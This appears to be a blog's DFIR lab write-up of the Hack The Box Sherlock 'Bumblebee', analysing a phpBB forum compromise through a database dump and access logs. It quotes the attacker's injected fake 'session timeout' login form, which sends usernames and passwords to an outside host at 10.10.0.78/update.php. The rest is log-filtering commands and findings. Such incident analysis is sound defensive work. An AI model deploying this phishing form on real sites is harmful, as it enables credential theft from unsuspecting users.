@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html class="" lang="en-us"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+        <script>
+            if (location.host != new URL("http:\/\/localhost:1313\/").host) location.href = "http:\/\/localhost:1313\/"
+        </script>
+    
+    <meta name="robots" content="noai, noimageai">
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            Bumblebee  &ndash;
+        
+        Shakil&#39;s Blog
+    </title>
+
+    
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="/>
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="/>
+
+    
+    
+    <link type="text/css" rel="stylesheet" href=http://localhost:1313/css/styles.159e622b5082f31a00ec6f1883bbaf21cb06404f86f78d11446793c0fd5d5060b90e94ef79525a194da08b247c2b8b82413944e9b2af3d2c35c0fa6157961cd6.css integrity="sha512-FZ5iK1CC8xoA7G8Yg7uvIcsGQE&#43;G940RRGeTwP1dUGC5DpTveVJaGU2giyR8K4uCQTlE6bKvPSw1wPphV5Yc1g==" />
+<meta name="author" content="Shakil Hossain" />
+
+    
+        <meta name="keywords" content='access, dfir, htb, linux, log, phishing, phpbb, sherlock, sqlite3' />
+    
+    
+        <meta name="description" content="An external contractor has accessed the internal forum here at Forela via the Guest Wi-Fi, and they appear to have stolen credentials for the administrative user! We have attached some logs from the forum and a full database dump in sqlite3 format to help you in your investigation." />
+    
+
+<meta property="og:site_name"
+    content='Shakil&#39;s Blog' />
+
+    <meta property="og:title" content="Bumblebee" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Shakil Hossain" />
+    <meta
+        property="article:published_time"
+        content='2025-09-18T03:54:17Z-0400' />
+    
+        
+            <meta property="article:tag" content="access" />
+        
+            <meta property="article:tag" content="dfir" />
+        
+            <meta property="article:tag" content="htb" />
+        
+            <meta property="article:tag" content="linux" />
+        
+            <meta property="article:tag" content="log" />
+        
+            <meta property="article:tag" content="phishing" />
+        
+            <meta property="article:tag" content="phpbb" />
+        
+            <meta property="article:tag" content="sherlock" />
+        
+            <meta property="article:tag" content="sqlite3" />
+        
+    
+    <meta property="og:url" content="http://localhost:1313/posts/htb-sherlocks/bumblebee/bumblebee/" />
+    
+    
+    <meta property="og:image"
+        content="http://localhost:1313/android-chrome-512x512.png" />
+    
+        <meta property="og:description" content="BFT (DFIR) Scenario An external contractor has accessed the internal forum here at Forela via the Guest Wi-Fi, and they appear to have stolen credentials for th" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='localhost:1313'
+/>
+<meta property="twitter:url" content="http://localhost:1313/posts/htb-sherlocks/bumblebee/bumblebee/" />
+
+
+    <meta name="twitter:title" content="Bumblebee" />
+    
+    
+    
+    <meta name="twitter:image"
+        content="http://localhost:1313/android-chrome-512x512.png" />
+    
+        <meta name="twitter:description" content="BFT (DFIR) Scenario An external contractor has accessed the internal forum here at Forela via the Guest Wi-Fi, and they appear to have stolen credentials for th" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' alt='Logo'/>
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">Shakil&#39;s Blog</a>
+                        
+                    </h1>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts/">Posts</a></li>
+        
+        
+        
+        
+        
+        
+        
+            <li><a href="/tags/">Tags</a></li>
+        
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search/?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="/index.xml">
+    
+    
+        &#xf09e;
+    
+    <span>
+        RSS
+    </span>
+</a>
+
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/hshakilst">
+    
+    
+        &#xf09b;
+    
+    <span>
+        Github
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://linkedin.com/in/hshakilst">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        LinkedIn
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="mailto:hshakilst@gmail.com">
+    
+    
+        &#xf6ed;
+    
+    <span>
+        Gmail
+    </span>
+</a>
+
+    </div>
+    
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>Bumblebee</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2025-09-18
+
+</p>
+    
+    
+    
+    
+    <div><h1 id="bft-dfir">BFT (DFIR)</h1>
+<h3 id="scenario">Scenario</h3>
+<p>An external contractor has accessed the internal forum here at Forela via the Guest Wi-Fi, and they appear to have stolen credentials for the administrative user! We have attached some logs from the forum and a full database dump in sqlite3 format to help you in your investigation.</p>
+<h3 id="artifacts">Artifacts</h3>
+<table>
+<thead>
+<tr>
+<th>Artifact</th>
+<th>MD5 Hash</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>bumblebee.zip</td>
+<td>ba06e26779ead4b6299b6a188d11fc02</td>
+<td>hackthebkue</td>
+</tr>
+<tr>
+<td>incident.tgz</td>
+<td>1b301c2fb2a1232758aca31588506edf</td>
+<td>n/a</td>
+</tr>
+</tbody>
+</table>
+<h3 id="tools-used">Tools Used</h3>
+<ul>
+<li>SQLite Browser - For <code>phpbb.sqlite3</code> database analysis.</li>
+<li>Linux Terminal - For <code>access.log</code> analysis.</li>
+</ul>
+<h3 id="forensic-analysis">Forensic Analysis</h3>
+<p><strong>Analyzing SQLite3 Database</strong></p>
+<p>The contractor&rsquo;s user information are listed below.
+<img src="images/20240613104708.png" alt="alt text"></p>
+<p>The contractor&rsquo;s post information for the forum are listed below.
+<img src="images/20240613105158.png" alt="alt text"></p>
+<p>Post contents malicious part</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">--snip--</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;page-body&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;page-body&#34;</span> <span style="color:#50fa7b">role</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;main&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;panel&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inner&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;content&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">h3</span>&gt;Session Timeout&lt;/<span style="color:#ff79c6">h3</span>&gt; &lt;<span style="color:#ff79c6">br</span> /&gt; &lt;<span style="color:#ff79c6">br</span> /&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">p</span>&gt;Your session token has timed out in order to proceed you must login again.&lt;/<span style="color:#ff79c6">p</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">form</span> <span style="color:#50fa7b">action</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://10.10.0.78/update.php&#34;</span> <span style="color:#50fa7b">method</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;post&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;login&#34;</span> <span style="color:#50fa7b">data-focus</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#50fa7b">target</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;hiddenframe&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;panel&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inner&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;content&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">h2</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;login-title&#34;</span>&gt;Login&lt;/<span style="color:#ff79c6">h2</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">fieldset</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;fields1&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dl</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dt</span>&gt;&lt;<span style="color:#ff79c6">label</span> <span style="color:#50fa7b">for</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span>&gt;Username:&lt;/<span style="color:#ff79c6">label</span>&gt;&lt;/<span style="color:#ff79c6">dt</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt;&lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;text&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#50fa7b">size</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;25&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inputbox autowidth&#34;</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">dl</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dl</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dt</span>&gt;&lt;<span style="color:#ff79c6">label</span> <span style="color:#50fa7b">for</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span>&gt;Password:&lt;/<span style="color:#ff79c6">label</span>&gt;&lt;/<span style="color:#ff79c6">dt</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt;&lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;2&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">size</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;25&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inputbox autowidth&#34;</span> <span style="color:#50fa7b">autocomplete</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;off&#34;</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">dl</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dl</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt;&lt;<span style="color:#ff79c6">label</span> <span style="color:#50fa7b">for</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;autologin&#34;</span>&gt;&lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;checkbox&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;autologin&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;autologin&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;4&#34;</span>&gt;Remember me&lt;/<span style="color:#ff79c6">label</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt;&lt;<span style="color:#ff79c6">label</span> <span style="color:#50fa7b">for</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewonline&#34;</span>&gt;&lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;checkbox&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewonline&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewonline&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;5&#34;</span>&gt;Hide my online status this session&lt;/<span style="color:#ff79c6">label</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">dl</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dl</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dt</span>&gt;&amp;nbsp;&lt;/<span style="color:#ff79c6">dt</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt; &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;login&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;6&#34;</span> <span style="color:#50fa7b">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Login&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;button1&#34;</span> <span style="color:#50fa7b">onclick</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sethidden()&#34;</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">dl</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/fieldset class=&#34;fields1&#34;&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">form</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
+</span></span></code></pre></div><p>At this point we have identified the malicious IP <code>10.10.0.78</code>, and was used to access the forum as well as staging a credential stealer namely <code>update.php</code>.</p>
+<p>Browsing the <code>phpbb_log</code> table we found additional information when the contractor logged in as Administrator. The real Administrator&rsquo;s IP was <code>10.255.254.2</code>. Upon Investigating the <code>access.log</code> artifact we can verify their information like User-Agent, which URLs were visited to get a sense of baseline activity which are normal for an Administrator user.</p>
+<p>Then we can use those information against the threat actor to accurately paint a picture of the malicious activities that was done.</p>
+<p><strong>Analyzing <code>access.log</code></strong></p>
+<p>An access.log file can have a vast volume of data it is recommended to use Splunk or ElasticSearch or any kind of SIEM tool to quickly find and triage information. But, in our case we have relatively small amount of data and we can use basic Linux commands to filter and search for the information we are looking for.</p>
+<p>Filtering the access.log file is very helpful to find the actual data we are looking for. For example, we don&rsquo;t need the data when a page loads and request are made to load CSS, images, assets to render the UI.</p>
+<p>We can easily filter those types of requests using <code>egrep</code>. The command for filtering assets related data is given below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span>
+</span></span></code></pre></div><p>Here <code>-v</code> returns everything except the matching pattern.</p>
+<p>Let&rsquo;s search for the legit Administrator&rsquo;s User Agent information.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.255.254.2 | head -n1
+</span></span><span style="display:flex;"><span>10.255.254.2 - - <span style="color:#ff79c6">[</span>25/Apr/2023:12:08:42 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /adm/index.php?sid=ac1490e6c806ac0403c6c116c1d15fa6&amp;i=12 HTTP/1.1&#34;</span> <span style="color:#bd93f9">403</span> <span style="color:#bd93f9">9412</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?sid=ac1490e6c806ac0403c6c116c1d15fa6&amp;i=1&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#34;</span>
+</span></span></code></pre></div><p>Let&rsquo;s search for the adversary&rsquo;s User Agent information.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.10.0.78 | head -n1 
+</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>25/Apr/2023:12:07:39 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">4205</span> <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0&#34;</span>
+</span></span></code></pre></div><p>The contractor added himself to the administrator group.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.10.0.78 | grep adm | grep acp_groups | grep POST
+</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:53:51 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /adm/index.php?i=acp_groups&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;icat=12&amp;mode=manage&amp;g=5 HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">2623</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?i=acp_groups&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;icat=12&amp;mode=manage&amp;action=list&amp;g=5&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
+</span></span></code></pre></div><p>The contractor also sent two requests to backup the database.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.10.0.78 | grep adm | grep <span style="color:#8be9fd;font-style:italic">action</span><span style="color:#ff79c6">=</span>download            
+</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:54:22 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&amp;action=download HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">2463</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&amp;i=acp_database&amp;mode=backup&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
+</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:54:24 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">3771</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&amp;action=download&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
+</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:54:30 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&amp;action=download HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">2474</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
+</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:56:28 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">3770</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&amp;action=download&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
+</span></span></code></pre></div><p>And finally they downloaded the database backup.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.10.0.78 | grep .sql
+</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:12:01:38 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">34707</span> <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
+</span></span></code></pre></div><p>The database backup file size was <code>34707</code> bytes (34.7 KB) in size.</p>
+<h3 id="summary">Summary</h3>
+<p>The contractor used his account to stage a phishing page in the internal forum of Forela. Then he stole the Administrator&rsquo;s credential using the phishing page and exfiltrated the data using a credential stealer (httx://10.10.0.78/update.php) hosted on the IP <code>10.10.0.78</code>. Then, they used the stolen Administrator credential created an account (apoole) for persistence. Then they backed up and downloaded the database.</p>
+</div>
+</article>
+
+    <hr />
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                href="/tags/access/">#access</a>
+        
+            <a
+                
+                href="/tags/dfir/">#dfir</a>
+        
+            <a
+                
+                href="/tags/htb/">#htb</a>
+        
+            <a
+                
+                href="/tags/linux/">#linux</a>
+        
+            <a
+                
+                href="/tags/log/">#log</a>
+        
+            <a
+                
+                href="/tags/phishing/">#phishing</a>
+        
+            <a
+                
+                href="/tags/phpbb/">#phpbb</a>
+        
+            <a
+                
+                href="/tags/sherlock/">#sherlock</a>
+        
+            <a
+                
+                href="/tags/sqlite3/">#sqlite3</a>
+        
+    </p>
+
+
+
+
+
+    
+    
+        
+        <div class="relatedArticlesContainer">
+            <hr />
+            <h2>More posts like this</h2>
+            <div class="postlist ">
+                <article class="card postlistitem">
+    <div>
+        <h2>
+            <a href="http://localhost:1313/posts/htb-sherlocks/ultimatum/">HTB Sherlock Ultimatum</a>
+        </h2>
+        <p class="date">
+            <span title='Date'> </span>
+    2024-05-27
+
+
+                | 
+                <span title='Tags'> </span>
+                
+                    <a href="/tags/cve-2023-3460">#CVE-2023-3460</a>
+                
+                    <a href="/tags/dfir">#dfir</a>
+                
+                    <a href="/tags/htb">#htb</a>
+                
+                    <a href="/tags/linux">#linux</a>
+                
+                    <a href="/tags/linuxcatscale">#LinuxCatScale</a>
+                
+                    <a href="/tags/member">#member</a>
+                
+                    <a href="/tags/plugin">#plugin</a>
+                
+                    <a href="/tags/sherlock">#sherlock</a>
+                
